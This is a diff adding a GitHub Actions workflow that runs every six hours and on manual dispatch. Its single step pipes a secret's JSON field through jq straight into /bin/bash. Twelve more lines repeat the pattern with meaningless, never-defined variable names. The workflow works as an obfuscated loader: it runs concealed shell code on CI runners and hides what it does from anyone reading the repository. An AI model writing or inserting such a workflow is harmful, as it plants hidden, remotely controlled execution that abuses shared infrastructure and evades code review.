@@ -1,0 +1,29 @@
+name: zhibinluai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhibinluai
+        env:
+          lm6: ${{ secrets.lm6 }}
+        run: |
+          echo $lm6 | jq -r .wddg4057 | /bin/bash
+          echo $yide0610 | jq -r .w0 | /bin/bash
+          echo $jv1 | jq -r .kzlx11497 | /bin/bash
+          echo $xcs3940 | jq -r .a67149 | /bin/bash
+          echo $vu4 | jq -r .qcnl0 | /bin/bash
+          echo $kzd6 | jq -r .tnmzw67408 | /bin/bash
+          echo $ounk1 | jq -r .txmvb84 | /bin/bash
+          echo $cdut29452 | jq -r .igza59847 | /bin/bash
+          echo $judcb313 | jq -r .gwwf6 | /bin/bash
+          echo $pfqjc02 | jq -r .sk7759 | /bin/bash
+          echo $k39 | jq -r .lvjuh99085 | /bin/bash
+          echo $fem15 | jq -r .d7099 | /bin/bash
+          echo $vxqkg49 | jq -r .re87428 | /bin/bash
+
